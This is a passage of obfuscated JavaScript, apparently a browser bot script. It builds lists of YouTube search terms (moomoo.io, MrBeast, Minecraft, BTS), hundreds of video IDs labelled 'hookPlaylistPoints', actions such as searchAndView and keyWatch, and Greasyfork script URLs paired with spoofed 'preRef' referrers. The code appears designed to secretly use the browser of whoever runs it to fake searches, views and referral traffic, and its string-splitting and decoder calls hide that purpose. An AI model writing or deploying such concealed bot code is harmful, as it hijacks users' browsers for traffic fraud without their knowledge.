searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + Y(0x3) + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + W(0x19, '!tSW') + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x638 + -0xf8b + 0x1 * 0x15cd)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1 * -0x1adf + -0x1714 + 0x31fd)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + V(0xf) + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x16ae + 0x77 + 0xe * -0x1a7);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    Y(0x1) + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    Y(0x13) + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    W(0x12, '&tKJ') + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    V(0x10) + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    W(0xc, '7qpq') + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': W(0x1a, 'y)RS') + 'easyfork.o' + V(0xd) + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
